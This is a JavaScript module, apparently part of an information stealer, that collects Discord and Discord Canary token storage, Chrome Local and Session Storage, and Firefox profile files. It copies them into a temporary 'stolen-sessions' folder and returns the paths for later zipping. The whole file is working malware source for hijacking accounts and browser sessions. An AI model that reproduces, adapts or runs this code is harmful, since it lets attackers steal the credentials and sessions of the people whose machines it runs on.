// session-stealer.js - Saves real session files to disk + returns data
const fs = require('fs/promises');
const path = require('path');
const os = require('os');

module.exports = async () => {
    try {
        console.log("[+] Session stealer started...");

        const roaming = process.env.APPDATA;
        const local = process.env.LOCALAPPDATA;

        const sessionPaths = [
            path.join(roaming, "discord", "Local Storage", "leveldb"),
            path.join(roaming, "discordcanary", "Local Storage", "leveldb"),
            path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            path.join(local, "Google", "Chrome", "User Data", "Default", "Session Storage"),
            path.join(roaming, "roaming", "Mozilla", "Firefox", "Profiles")
        ];

        const found = [];
        const savedPaths = [];

        const tempDir = path.join(os.tmpdir(), 'stolen-sessions');
        await fs.mkdir(tempDir, { recursive: true });

        for (const p of sessionPaths) {
            try {
                const files = await fs.readdir(p);
                for (const file of files) {
                    if (file.endsWith(".log") || file.endsWith(".ldb") || file.includes("Session")) {
                        const fullPath = path.join(p, file);

                        // Save copy to temp folder
                        const destPath = path.join(tempDir, `${path.basename(p)}_${file}`);
                        try {
                            await fs.copyFile(fullPath, destPath);
                            savedPaths.push(destPath);
                        } catch (e) {
                            // Skip if can't copy
                        }

                        found.push({
                            browser: p.includes("Chrome") ? "Chrome" :
                                     p.includes("discord") ? "Discord" : "Firefox",
                            filename: file,
                            path: fullPath,
                            savedAs: destPath
                        });
                    }
                }
            } catch (e) {
                // Path doesn't exist or permission issue, skip silently
            }
        }

        console.log(`[+] Session stealer found ${found.length} session files`);

        return {
            count: found.length,
            sessions: found,
            savedPaths: savedPaths   // ← For zip creation
        };

    } catch (e) {
        console.log("[-] Session stealer error:", e.message);
        return {
            count: 0,
            sessions: [],
            savedPaths: [],
            error: e.message
        };
    }
};

